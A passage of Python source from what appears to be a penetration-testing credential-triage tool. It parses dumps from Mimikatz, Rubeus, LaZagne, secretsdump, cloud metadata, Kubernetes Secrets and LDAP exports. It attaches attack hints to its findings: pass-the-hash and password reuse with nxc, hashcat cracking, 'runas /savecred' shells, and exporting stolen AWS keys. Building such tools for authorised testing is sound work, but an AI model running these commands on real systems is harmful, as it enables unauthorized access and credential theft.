                    text[:16384])
                _snmp_target = (_snmp_host_m.group(1) if _snmp_host_m
                                 else "<snmp-host>")
                report.add("MEDIUM", "RECON", path, _ln(_sp),
                           f"SNMP UDP 161 open on {_snmp_target} - "
                           f"try v1/v2c community guess",
                           hint=(f"onesixtyone -c /usr/share/wordlists/"
                                 f"snmp/common-communities.txt "
                                 f"{_snmp_target}  |  or: for c in public "
                                 f"private manager cisco community; do "
                                 f"snmpwalk -v2c -c $c -t 1 {_snmp_target}"
                                 f" && echo FOUND:$c; done"))

    # Mimikatz NTLM block (logonpasswords)
    for m in _MK_NTLM.finditer(text):
        if not _no_bleed(m, 1, 3, _MK_USER_BLEED):
            continue
        u, dom, nt = m.group(1), m.group(2), m.group(3)
        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
            continue
        # iter-174: shell-escape u for hint splice (mimikatz output can
        # carry SAM names with apostrophes on international deployments).
        _u_sh = u.replace("'", "'\\''")
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"NTLM (NT) {dom}\\{u}: {nt}",
                   hint=f"PtH: nxc smb <host> -d {dom} -u '{_u_sh}' -H {nt}  |  crack: hashcat -m 1000 <nt> rockyou.txt")
        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))

    # Mimikatz wdigest cleartext
    for m in _MK_WDIGEST.finditer(text):
        if not _no_bleed(m, 1, 3, _MK_USER_BLEED):
            continue
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw) or pw.lower() in ("(null)", "n/a"):
            continue
        # iter-174: shell-escape u + pw for hint splice.
        _u_sh = u.replace("'", "'\\''")
        _pw_sh = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"wdigest cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u '{_u_sh}' -p '{_pw_sh}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom, source=path, line=_ln(m)))

    # Mimikatz lsadump::sam
    for m in _MK_SAM.finditer(text):
        if not _no_bleed(m, 1, 2, _MK_RID_BLEED):
            continue
        u, nt = m.group(1), m.group(2)
        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
            continue
        # iter-174: shell-escape u for hint splice.
        _u_sh = u.replace("'", "'\\''")
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"SAM NTLM {u}: {nt}",
                   hint=f"PtH local: nxc smb <host> -u '{_u_sh}' -H {nt} --local-auth")
        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))

    # Mimikatz dpapi::cred typed
    for m in _MK_DPAPI_CRED.finditer(text):
        if not _no_bleed(m, 1, 3, _MK_CRED_BLEED):
            continue
        target, u, blob = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
        report.add("HIGH", "CRED PAIRS", path, _ln(m),
                   f"DPAPI cred for {target} ({u}): {blob[:50]}",
                   hint="if blob looks like plaintext, reuse; else SharpDPAPI / dpapi.py to decrypt")
        # iter-13: feed the Evidence store so downstream chain logic sees it.
        if store is not None:
            store.add(Evidence(kind="cred", user=u, plaintext=blob,
                               source=path, line=_ln(m)))

    # Rubeus kerberoast: user-bound hash binding
    for m in _RUBEUS_KERB.finditer(text):
        if not _no_bleed(m, 1, 2, _SAM_BLEED):
            continue
        u, h = m.group(1), m.group(2)
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"Kerberoast TGS ({u}): {h[:60]}...",
                   hint=f"hashcat -m 13100 tgs.txt rockyou.txt - cracked plaintext = {u}'s svc-account password")
        HASHES.append(("13100", "Kerberoast TGS", h, path, _ln(m)))
        # iter-13: store the kerberoastable principal for chain enrichment
        if store is not None:
            store.add(Evidence(kind="kerberoastable", user=u,
                               source=path, line=_ln(m)))

    # PowerView Get-DomainUser kerberoastable
    # iter-167: apply _SAM_BLEED guard so a two-user Get-DomainUser dump
    # doesn't mismatch svc_web's samaccountname with svc_db's spn (very
    # common with piped `Get-DomainUser -SPN | fl *`). Existing _SAM_BLEED
    # anchor from iter-12 is defined above at line 1142.
    for m in _PV_KERB.finditer(text):
        if not _no_bleed(m, 1, 2, _SAM_BLEED):
            continue
        u, spn = m.group(1), m.group(2)
        report.add("HIGH", "RECON", path, _ln(m),
                   f"Kerberoastable: {u}  spn={spn[:50]}",
                   hint="impacket-GetUserSPNs <dom>/<user>:<pw> -dc-ip <dc> -request -outputfile tgs.txt; hashcat -m 13100")
        if store is not None:
            store.add(Evidence(kind="kerberoastable", user=u,
                               source=path, line=_ln(m)))

    # cmdkey /list saved
    # iter-168: bleed guard - a cmdkey block missing its `User:` line
    # would mispair Target[N] with User[N+1] (verified in audit).
    for m in _CMDKEY_LIST.finditer(text):
        if not _no_bleed(m, 1, 2, _CMDKEY_BLEED):
            continue
        target, u = m.group(1).strip(), m.group(2).strip()
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"cmdkey saved cred for {target} (user: {u})",
                   hint=f"runas /savecred /user:\"{u}\" \"cmd.exe\"  - opens a shell as that user")
        if store is not None:
            store.add(Evidence(kind="user", user=u, host=target,
                               source=path, line=_ln(m)))

    # Lazagne extracted creds
    for m in _LAZAGNE.finditer(text):
        if not _no_bleed(m, 1, 2, _LAZAGNE_BLEED):
            continue
        u, p = m.group(1), m.group(2).strip()
        if (filters.is_placeholder(p) or filters.is_placeholder(u)
                or p.lower() in ("(null)", "[empty]", "(empty)")):
            continue
        # iter-176: shell-escape pw.
        _p_sh_lz = p.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"Lazagne extracted: {u}:{p}",
                   hint=f"reuse: nxc smb <host> -u <user> -p '{_p_sh_lz}'  - browser/wifi/mail/DPAPI lift")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))

    # pspy: surface ROOT (UID=0) cron/service argv only; non-root is noise.
    # Each path emits at most a few top findings (avoid blowing the dashboard).
    pspy_seen = set()
    pspy_n = 0
    for m in _PSPY_LINE.finditer(text):
        if pspy_n >= 12:
            break
        uid = m.group(1)
        cmd = m.group(2).strip()
        # only flag root + suppress kernel-thread / login churn
        if uid != "0":
            continue
        if not cmd or cmd in pspy_seen:
            continue
        # ignore trivially benign / noisy entries
        cmd_lc = cmd.lower()
        if cmd_lc.startswith(("[", "/usr/lib/systemd", "/lib/systemd",
                              "sshd:", "(sd-pam)", "sleep ", "/usr/bin/dbus")):
            continue
        # interesting: scripts under /opt /home /tmp /var, or anything with a
        # plausible secret on the cmdline (-p, --password, token=, key=)
        is_script = any(p in cmd for p in ("/opt/", "/home/", "/tmp/", "/var/",
                                            "/root/", "/etc/cron"))
        is_secret_arg = bool(re.search(r'(?i)(--password|-p\s+\S|token=|api[_-]?key=|secret=)', cmd))
        if not (is_script or is_secret_arg):
            continue
        pspy_seen.add(cmd)
        pspy_n += 1
        sev = "HIGH" if is_secret_arg else "MEDIUM"
        report.add(sev, "INTERESTING FILES", path, _ln(m),
                   f"pspy root cmd: {cmd[:160]}",
                   hint="root cron/service path - check perms; if writable / argv leaks creds, that IS the privesc")

    # Docker registry config.json auths - base64(user:pass) per registry
    # iter-169: gate on `"auths":{` context anchor so the per-entry pattern
    # only fires inside a real docker config, not any random JSON that
    # happens to have "registry":{"auth":"..."} shape.
    import base64 as _b64
    if not _DOCKER_AUTH_CTX.search(text):
        _docker_auth_iter = ()
    else:
        _docker_auth_iter = _DOCKER_AUTH.finditer(text)
    for m in _docker_auth_iter:
        registry, b64 = m.group(1), m.group(2)
        if filters.is_placeholder(b64):
            continue
        try:
            raw = _b64.b64decode(b64, validate=True).decode("utf-8", errors="replace")
        except Exception:
            continue
        if ":" not in raw:
            continue
        u, _, p = raw.partition(":")
        u, p = u.strip(), p.strip()
        if not p or filters.is_placeholder(p) or len(p) < 3:
            continue
        # iter-174: shell-escape u + p for hint splice.
        _u_sh_d = u.replace("'", "'\\''")
        _p_sh_d = p.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"Docker registry {registry} : {u}:{p}",
                   hint=f"docker login {registry} -u '{_u_sh_d}' -p '{_p_sh_d}'  - registry push/pull; sometimes reused for SSH/SMB")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                               source=path, line=_ln(m)))

    # AWS IMDS capture: surface short-lived IAM role STS creds.
    # iter-12 FP audit: Terraform .tfstate and CDK output also embed
    # "AccessKeyId" / "SecretAccessKey" fields - they are LITERAL state, not
    # IMDS captures. Require an IMDS-shaped marker (`"Code":"Success"`,
    # `"Type":"AWS-HMAC"`, `latest/meta-data/iam`, `LastUpdated`) in the
    # surrounding text. Filename gate also skips tfstate-shaped paths.
    _IMDS_CONTEXT = re.compile(
        r'(?i)"Code"\s*:\s*"Success"|"Type"\s*:\s*"AWS-HMAC"|'
        r'latest/meta-data/iam|"LastUpdated"\s*:|169\.254\.169\.254')
    plow = path.lower()
    if (plow.endswith((".tfstate", ".tfstate.backup", ".tfplan", ".tfvars"))
            or "/cdk.out/" in plow):
        skip_imds = True
    else:
        skip_imds = False
    for m in _IMDS_BLOCK.finditer(text):
        if skip_imds:
            continue
        # iter-172: bleed guard - a partial IMDS block missing SAK would
        # grab the next role dump's SAK.
        if not _no_bleed(m, 1, 2, _IMDS_BLEED):
            continue
        akid, sak, tok = m.group(1), m.group(2), m.group(3)
        if filters.is_placeholder(akid) or filters.is_canonical_sample(akid):
            continue
        # iter-12: require IMDS-shaped context within +/- 2KB so plain
        # terraform-style JSON without the IMDS-distinctive fields doesn't fire.
        ctx_start = max(0, m.start() - 2048)
        ctx_end = min(len(text), m.end() + 2048)
        if not _IMDS_CONTEXT.search(text[ctx_start:ctx_end]):
            continue
        # iter-16: was emitting literal '<sak>' / '<tok>' placeholders even
        # though we already captured the values. Use them directly.
        report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                   f"AWS STS creds (IMDS): AccessKeyId={akid}",
                   hint=(f"export AWS_ACCESS_KEY_ID={akid}; "
                         f"export AWS_SECRET_ACCESS_KEY={sak}; "
                         + (f"export AWS_SESSION_TOKEN={tok}; " if tok else "")
                         + "aws sts get-caller-identity"))
        report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                   f"AWS Secret Access Key (IMDS): {sak[:8]}{'*'*(len(sak)-8)}",
                   hint="paired with AccessKeyId above; short-lived if 'Token' present")
        if tok:
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f"AWS Session Token (IMDS): {tok[:20]}{'*'*16}",
                       hint="must export AWS_SESSION_TOKEN alongside the AccessKeyId/SecretAccessKey")

    # iter-29: Kubernetes Secret manifest (apiVersion:v1, kind:Secret) with
    # data.<key>: <b64> entries. Decode each b64 and if it looks like a
    # password (printable, 4-80 chars, not placeholder), emit as CRED PAIRS.
    # Gated to files whose first ~400 bytes have both 'apiVersion' and
    # 'kind: Secret' to skip generic YAML.
    # iter-31 FP fix: also suppress on doc/cheatsheet files - a docs page
    # showing an example Secret manifest with 'password-goes-here' or
    # 'my-app-secret' isn't a real cred.
    if ("kind: Secret" in text[:800]
            and ("apiVersion" in text[:200] or "apiVersion" in text[:800])
            and not filters.is_doc_file(path)):
        # iter-192: split data: (b64) and stringData: (plaintext). Old code
        # tried to b64-decode BOTH blocks, silently dropping plaintext values
        # from stringData:. Different regex for each.
        _K8S_DATA_B64 = re.compile(
            r'(?im)^\s{2,6}([A-Za-z][A-Za-z0-9_-]{1,60})\s*:\s*'
            r'"?([A-Za-z0-9+/=]{8,})"?\s*$')
        _K8S_STRDATA = re.compile(
            r'(?im)^\s{2,6}([A-Za-z][A-Za-z0-9_-]{1,60})\s*:\s*'
            r'["\']?([^"\'\r\n]{3,200})["\']?\s*$')
        import base64 as _b64_k8s
        # 'data' | 'stringData' | None
        block = None
        for lineno_k, line_k in enumerate(text.split("\n"), 1):
            ls = line_k.rstrip()
            _hdr = re.match(r'^\s*(data|stringData)\s*:\s*$', ls)
            if _hdr:
                block = _hdr.group(1)
                continue
            if block and ls and not ls.startswith(" "):
                block = None
            if not block:
                continue
            if block == "data":
                mk = _K8S_DATA_B64.match(line_k)
                if not mk:
                    continue
                k, v = mk.group(1), mk.group(2)
                try:
                    dec = _b64_k8s.b64decode(v, validate=True).decode(
                        "utf-8", "replace").rstrip("\r\n")
                except Exception:
                    continue
                if not dec or len(dec) > 200 or not dec.isprintable():
                    continue
                _label_prefix = "data"
            else:  # stringData - plaintext already
                mk = _K8S_STRDATA.match(line_k)
                if not mk:
                    continue
                k, dec = mk.group(1), mk.group(2).strip()
                if not dec or len(dec) > 200:
                    continue
                _label_prefix = "stringData"
            if filters.is_placeholder(dec):
                continue
            klower = k.lower()
            is_credy = any(h in klower for h in ("pass", "pwd", "token", "secret",
                                                  "key", "cred", "user", "auth"))
            if is_credy:
                report.add("CRITICAL", "CRED PAIRS", path, lineno_k,
                           f"K8s Secret {_label_prefix}.{k}: {dec}",
                           hint=(f"apiVersion v1 Secret {_label_prefix} value; "
                                 f"reuse '{dec}' as cred against the workload"))
                from analyzers.ingest.evidence import Evidence
                store.add(Evidence(kind="plaintext", plaintext=dec, source=path,
                                   line=lineno_k)) if store is not None else None

    # iter-28: RabbitMQ definitions.json users[].password_hash. The name +
    # password_hash + hashing_algorithm triplet spans JSON lines so we run
    # this at file scope. Only fire in files that look like RabbitMQ
    # definitions (path contains 'definitions.json' or matches the
    # top-level 'rabbit_version' marker).
    _RMQ_PWHASH = re.compile(
        r'"name"\s*:\s*"([^"]{1,80})"\s*,\s*"password_hash"\s*:\s*'
        r'"([A-Za-z0-9+/=]{20,})"\s*,\s*"hashing_algorithm"\s*:\s*'
        r'"([^"]{1,40})"')
    plow_rmq = path.lower()
    if ("definitions.json" in plow_rmq or "rabbit" in plow_rmq
            or '"rabbit_version"' in text[:400]):
        for m in _RMQ_PWHASH.finditer(text):
            if filters.is_doc_file(path):
                continue
            u, ph, algo = m.group(1), m.group(2), m.group(3)
            report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                       f"RabbitMQ {u} password_hash ({algo}): {ph}",
                       hint=("hash = base64(salt(4B) || sha256(salt||utf8(pw))). "
                             "Offline: for pw in rockyou; check sha256(salt||pw) "
                             "== decoded[4:]"))

    # PowerShell transcript header - flag the file for deeper inspection
    # iter-171: bleed guard - transcript block missing its Machine line
    # would grab the next transcript's Machine, falsely attributing the
    # user to that host.
    for m in _PS_TRANSCRIPT.finditer(text):
        if not _no_bleed(m, 1, 2, _PS_TRANSCRIPT_BLEED):
            continue
        u, machine = m.group(1).strip(), m.group(2).strip()
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"PowerShell transcript: {u} on {machine}",
                   hint=("operator session log - search for ConvertTo-SecureString, "
                         "-Password, Get-Credential, plaintext invocations"))

    # PowerShell transcripts / history: ConvertTo-SecureString -String "pw"
    for m in _PS_CONVERT_SECRET.finditer(text):
        pw = m.group(1)
        if filters.is_placeholder(pw):
            continue
        # iter-176: shell-escape pw.
        _pw_sh_ps = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"PowerShell plaintext secret: {pw}",
                   hint=f"captured from -AsPlainText invocation; try as user pw: nxc smb <host> -u <user> -p '{_pw_sh_ps}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", plaintext=pw, source=path, line=_ln(m)))

    # iter-24: Set-LocalUser / Set-ADAccountPassword / net user with literal
    # plaintext in PowerShell history. Common patterns:
    #   net user Administrator P@ssw0rd! /domain
    #   Set-LocalUser -Name svc -Password (ConvertTo-SecureString "P@ss" -AsPlainText)
    #   Set-ADAccountPassword -Identity svc -NewPassword (ConvertTo-SecureString "P@ss" -AsPlainText -Force) -Reset
    # The ConvertTo-SecureString form is already caught by _PS_CONVERT_SECRET
    # (after the line-continuation join above). Catch the bare 'net user' here.
    _NET_USER_PW = re.compile(
        r'(?im)^\s*net\s+user\s+(\S{1,50})\s+([^\s/][\S]{2,60})(?:\s+/(?:add|domain|active))?\s*$')
    for m in _NET_USER_PW.finditer(text):
        u, pw = m.group(1), m.group(2)
        if filters.is_placeholder(pw) or pw.startswith(("*", "/")):
            continue
        # iter-173: shell-escape u + pw for parity with the wider sweep.
        _u_sh = u.replace("'", "'\\''")
        _pw_sh = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"net user plaintext: {u}:{pw}",
                   hint=f"from PowerShell/cmd history; try: nxc smb <host> -u '{_u_sh}' -p '{_pw_sh}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                               source=path, line=_ln(m)))

    # Burp captured Authorization: Basic <base64>
    for m in _HTTP_AUTH_BASIC.finditer(text):
        b64 = m.group(1)
        if filters.is_placeholder(b64):
            continue
        try:
            raw = _b64.b64decode(b64 + "==", validate=False).decode("utf-8", errors="replace")
        except Exception:
            continue
        if ":" not in raw or len(raw) > 200:
            continue
        u, _, p = raw.partition(":")
        u, p = u.strip(), p.strip()
        if (not u or not p or filters.is_placeholder(p) or len(p) < 3
                or not raw.isprintable()):
            continue
        # iter-174: shell-escape u + p for hint splice.
        _u_sh_b = u.replace("'", "'\\''")
        _p_sh_b = p.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"HTTP Basic captured: {u}:{p}",
                   hint=f"reuse: nxc smb <host> -u '{_u_sh_b}' -p '{_p_sh_b}' ; also try app SSO / webmail / VPN")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))

    # iter-186 FP-audit gate: OSCP+ walkthrough markdown files and API-
    # tutorial docs constantly show example `Authorization: Bearer ghp_...`
    # and `X-Api-Key: abcdef...` shapes. Skip the entire HTTP-header
    # dispatch block on doc files - real loot lives in Burp captures /
    # .http request logs / actual response bodies, never in *.md prose.
    _http_is_doc = filters.is_doc_file(path)

    # Burp captured Authorization: Bearer <JWT>
    jwt_seen = set()
    for m in _HTTP_AUTH_BEARER_JWT.finditer(text):
        if _http_is_doc:
            break
        tok = m.group(1)
        if tok in jwt_seen:
            continue
        jwt_seen.add(tok)
        report.add("HIGH", "ASSIGNED SECRETS", path, _ln(m),
                   f"HTTP Bearer JWT: {tok[:30]}...",
                   hint="decode at jwt.io (offline) - check alg=none, weak HS256 secret (hashcat -m 16500), expiry")

    # iter-185: Authorization: Bearer <opaque-token> (non-JWT PATs / API keys
    # whose format is well-known - GitHub ghp_/gho_/glpat-, OpenAI sk-,
    # Slack xox[bp]-, Notion ntn_, DigitalOcean doo_v1_, Sendgrid SG.*.*,
    # etc.). CRITICAL because these are typically namespace-wide account
    # keys, not per-session tokens. Providers infer from prefix.
    _PROVIDER_HINTS = {
        "gh": ("GitHub PAT",
               "gh api /user OR curl -H 'Authorization: token <tok>' "
               "https://api.github.com/user  - repo/org access"),
        "gl": ("GitLab PAT",
               "curl -H 'PRIVATE-TOKEN: <tok>' https://gitlab.example/"
               "api/v4/user  - project foothold"),
        "sk": ("OpenAI API key",
               "billing risk; if scope=admin can create keys. Do NOT hit "
               "the live endpoint on exam - flag as intel"),
        "xo": ("Slack token",
               "SlackPirate / slack-audit: enumerate channels, users, "
               "files. Bot tokens (xoxb) are org-wide."),
        "nt": ("Notion integration token", "flag as intel"),
        "sq": ("Square API token", "flag as intel"),
        "do": ("DigitalOcean token",
               "doctl auth init -t <tok> then doctl compute droplet list"),
        "nv": ("NVIDIA API key", "flag as intel"),
        "SG": ("Sendgrid API key",
               "SendGrid mail API - could enable phishing; flag as intel"),
        "pa": ("Airtable PAT", "flag as intel"),
        "gi": ("GitHub fine-grained PAT",
               "curl -H 'Authorization: token <tok>' https://api.github.com/user"),
    }
    bearer_seen = set()
    for m in _HTTP_AUTH_BEARER_OPAQUE.finditer(text):
        if _http_is_doc:
            break
        tok = m.group(1)
        if tok in bearer_seen:
            continue
        bearer_seen.add(tok)
        prefix = tok[:2]
        # SG.foo.bar has SG. as its literal marker (uppercase); handle separately
        if tok.startswith("SG."):
            prefix = "SG"
        elif tok.startswith("github_pat_"):
            prefix = "gi"
        provider, hint = _PROVIDER_HINTS.get(prefix,
            ("opaque bearer token", "flag as intel; provider unknown"))
        report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                   f"HTTP Bearer opaque ({provider}): {tok[:35]}"
                   f"{'...' if len(tok) > 35 else ''}",
                   hint=hint)
        if store is not None:
            store.add(Evidence(kind="plaintext", plaintext=tok,
                               source=path, line=_ln(m)))

    # iter-185: X-Api-Key / Api-Key / apikey / X-Auth-Token / X-Access-Token
    # header. Common in modern API walkthroughs (curl, Postman, PS
    # Invoke-WebRequest -Headers @{X-Api-Key='...'}).
    apikey_seen = set()
    for m in _HTTP_APIKEY_HEADER.finditer(text):
        if _http_is_doc:
            break
        header, tok = m.group(1), m.group(2)
        if tok in apikey_seen:
            continue
        # Reject placeholder / obvious canonical sample values
        if (filters.is_placeholder(tok) or filters.is_canonical_sample(tok)
                or filters.is_known_example(tok)):
            continue
        # Reject values that look like a variable ref rather than a real token
        # ($SECRET, ${API_KEY}, {{ api_key }}, etc.).
        if tok.startswith(("$", "{", "%")):
            continue
        apikey_seen.add(tok)
        report.add("HIGH", "ASSIGNED SECRETS", path, _ln(m),
                   f"HTTP {header}: {tok[:35]}"
                   f"{'...' if len(tok) > 35 else ''}",
                   hint=(f"replay: curl -H '{header}: {tok}' "
                         f"'https://<api-host>/<path>'  - API key auth; "
                         f"look for /api/user endpoint to enumerate scope"))
        if store is not None:
            store.add(Evidence(kind="plaintext", plaintext=tok,
                               source=path, line=_ln(m)))

    # Sherlock / Watson / wesng / PrivescCheck missing-patch output
    # Skip markdown writeups / cheatsheets - they routinely show wesng sample
    # blocks as documentation, not real loot.
    if filters.is_doc_file(path):
        return
    vuln_seen = set()
    for m in _WESNG_VULN.finditer(text):
        # iter-170: bleed guard - a wesng block with no VulnStatus line
        # would pull the next block's VulnStatus, falsely marking this
        # block "Appears Vulnerable".
        if not _no_bleed(m, 3, 4, _WESNG_BLEED):
            continue
        title, kb, cve, status = (m.group(1).strip(), m.group(2).strip(),
                                  m.group(3).strip(), m.group(4).strip())
        key = (kb, cve)
        if key in vuln_seen:
            continue
        vuln_seen.add(key)
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"missing patch: {title} ({kb}, {cve}) — {status}",
                   hint=("verify on host: systeminfo | findstr KB ; "
                         f"local public PoC search by CVE id (manual on Kali): searchsploit {cve}"))
    for m in _PE_JSON_VULN.finditer(text):
        # iter-171: bleed guard - PrivescCheck vuln object missing its CVE
        # field would grab the next object's CVE, misattributing a KB to
        # the wrong CVE.
        if not _no_bleed(m, 1, 2, _PE_VULN_BLEED):
            continue
        kb, cve = m.group(1).strip(), m.group(2).strip()
        key = (kb, cve)
        if key in vuln_seen:
            continue
        vuln_seen.add(key)
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"PrivescCheck missing patch: {kb} ({cve})",
                   hint=f"verify on host: systeminfo | findstr KB ; manual PoC search: searchsploit {cve}")

    # iter-12 composite: Terraform state "sensitive": true paired with the
    # SAME block's "value": "<secret>". JSON ordering may put either field
    # first. Iterate top-level output keys + check whether the block carries
    # both `"sensitive": true` AND a `"value": "..."`, treating that as a
    # validated pair within ONE block.
    # Inner leaf block: braces don't nest (no `{` inside `body`).
    _TF_BLOCK = re.compile(
        r'"([\w-]{1,80})"\s*:\s*\{([^{}]{1,600})\}', re.MULTILINE)
    plow_tf = path.lower()
    if plow_tf.endswith((".tfstate", ".tfstate.backup", ".tfplan")):
        tfs_seen = set()
        for m in _TF_BLOCK.finditer(text):
            var, block = m.group(1), m.group(2)
            if '"sensitive"' not in block or '"value"' not in block:
                continue
            if not re.search(r'"sensitive"\s*:\s*true', block):
                continue
            vm = re.search(r'"value"\s*:\s*"([^"]{3,200})"', block)
            if not vm:
                continue
            val = vm.group(1)
            if filters.is_placeholder(val) or filters.is_known_example(val):
                continue
            if val in tfs_seen:
                continue
            tfs_seen.add(val)
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f"tfstate sensitive {var}: {val}",
                       hint=f"terraform output {var}; reuse against the provisioned resource")
            if store is not None:
                store.add(Evidence(kind="plaintext", plaintext=val,
                                   source=path, line=_ln(m)))

    # iter-21: LDAP description / info / comment / userPassword cleartext.
    # Common AD trick (HTB Forest, Cascade, Resolute, Sauna; PG Practice
    # writeups) — sysadmin embeds passwords in plain LDAP attributes.
    # We ONLY fire inside an LDIF block (a `dn:` marker within ~30 prior
    # lines) so we don't FP on prose / log files / config XMLs.
    _LDIF_ATTR_PW = re.compile(
        r'(?im)^(description|info|comment|userPassword|userParameters|'
        r'pwdLastSet|pwdHistory)\s*::?\s*(.{6,200})$')
    _LDIF_DN_MARKER = re.compile(r'(?im)^dn\s*:', re.MULTILINE)
    plow_ldif = path.lower()
    is_ldif_path = (plow_ldif.endswith((".ldif", ".ldap", ".ldp", ".bh.json"))
                    or "bloodhound" in plow_ldif
                    or "ldapdomaindump" in plow_ldif
                    or "ldapsearch" in plow_ldif)
    if (is_ldif_path or _LDIF_DN_MARKER.search(text)) and not filters.is_doc_file(path):
        # Extract candidate password TOKENS from a prose value (HTB Forest:
        # `description: Account created. Password is Tempo2024!`). The full
        # value may be sentence-shaped; the actual cred sits as a single
        # token that mixes upper + digit + symbol.
        _PWTOK = re.compile(r'\b([A-Za-z]\S*\d\S*|\S*\d\S*[A-Z]\S*)[!@#$%^&*+=\-_]\S*\b')
        for m in _LDIF_ATTR_PW.finditer(text):
            attr, raw = m.group(1).lower(), m.group(2).strip()
            if filters.is_placeholder(raw) or filters.is_known_example(raw):
                continue
            # userPassword / userParameters: explicit cred field - the whole
            # value IS the cred. Otherwise we extract candidate tokens.
            candidates = []
            if attr in ("userpassword", "userparameters"):
                candidates = [raw]
            else:
                # try the whole value first if it's compact enough
                if (len(raw) <= 60 and " " not in raw
                        and any(c.isdigit() for c in raw)
                        and any(c.isupper() for c in raw)):
                    candidates.append(raw)
                # always also extract substring tokens from prose
                for tm in _PWTOK.finditer(raw):
                    candidates.append(tm.group(1) + tm.group(0)[len(tm.group(1)):])
                # fall back to splitting on whitespace + filtering tokens
                for tok in raw.split():
                    if (8 <= len(tok) <= 40
                            and any(c.isdigit() for c in tok)
                            and any(c.isupper() for c in tok)
                            and any(c in "!@#$%^&*+=-_" for c in tok)):
                        candidates.append(tok.rstrip(".,;:!?)"))
            seen_cand = set()
            for cand in candidates:
                cand = cand.strip("'\"`.,;:")
                if not cand or cand in seen_cand:
                    continue
                seen_cand.add(cand)
                if filters.is_placeholder(cand) or len(cand) < 6:
                    continue
                # principal via the most-recent preceding dn:
                ctx = text[max(0, m.start() - 1500):m.start()]
                principal = "?"
                for dnm in re.finditer(r'(?im)^dn\s*:\s*([^\r\n]+)', ctx):
                    cn = re.search(r'(?i)CN=([^,]+)', dnm.group(1))
                    if cn:
                        principal = cn.group(1).strip()
                sev = "CRITICAL" if attr == "userpassword" else "HIGH"
                report.add(sev, "CRED PAIRS", path, _ln(m),
                           f"LDAP {attr} on {principal}: {cand}",
                           hint=(f"AD trick - admin embedded a cred in the {attr} attribute. "
                                 f"reuse: nxc smb <dc> -u '{principal}' -p '{cand}'"))
                if store is not None:
                    store.add(Evidence(kind="plaintext", user=principal, plaintext=cand,
                                       source=path, line=_ln(m)))
                break  # one cred per attr line

    # iter-117: LSA DPAPI_SYSTEM secret block emitted by impacket-secretsdump
    # every time the SECURITY hive is decrypted. Format:
    #   [*] DPAPI_SYSTEM
    #   dpapi_machinekey:0x{40hex}
    #   dpapi_userkey:0x{40hex}
    # dpapi_machinekey unwraps SYSTEM-scope DPAPI masterkeys (services, IIS
    # applicationhost, Scheduled Tasks). dpapi_userkey unwraps user-scope MKs
    # when the user's plaintext is unknown. Emit them as dpapi_mk Evidence
    # tagged with 'system=True' so R-DPAPI can pair with any Credentials\ blob
    # even without a per-user masterkey file.
    _LSA_DPAPI_SYSTEM = re.compile(
        r'(?im)^\s*\[\*\]\s*DPAPI_SYSTEM\s*\r?\n'
        r'\s*dpapi_machinekey\s*:\s*0x([0-9a-f]{40})\s*\r?\n'
        r'\s*dpapi_userkey\s*:\s*0x([0-9a-f]{40})\s*$')
    for m in _LSA_DPAPI_SYSTEM.finditer(text):
        if filters.is_doc_file(path):
            continue
        mk_key, uk_key = m.group(1), m.group(2)
        if filters.is_canonical_sample(mk_key):
            continue
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"LSA DPAPI_SYSTEM: machinekey=0x{mk_key[:16]}... "
                   f"userkey=0x{uk_key[:16]}...",
                   hint=(f"impacket-dpapi masterkey -file <mk-blob> "
                         f"-system {mk_key}  # unwrap SYSTEM DPAPI MK; then "
                         f"impacket-dpapi credential -file <cred> -key 0x<sha1>"))
        if store is not None:
            store.add(Evidence(kind="dpapi_mk", source=path, line=_ln(m),
                               meta={"sha1": mk_key, "system": True,
                                     "userkey": uk_key}))

    # iter-18: LSA secret `[*] _SC_<service>` cleartext service-account password
    # (impacket secretsdump.py LSASecrets output)
    _LSA_SC = re.compile(
        r'(?im)^\s*\[\*\]\s*_SC_(\S+)\s*\r?\n'
        r'\s*(?:\(Unknown User\)|([^\s:\\]+(?:\\[^\s:\\]+)?)):([^\r\n]{3,200})\s*$')
    for m in _LSA_SC.finditer(text):
        if filters.is_doc_file(path):
            continue
        svc = m.group(1).strip()
        user = (m.group(2) or "").strip()
        pw = m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        principal = user or f"({svc} service)"
        # iter-175: shell-escape principal + pw.
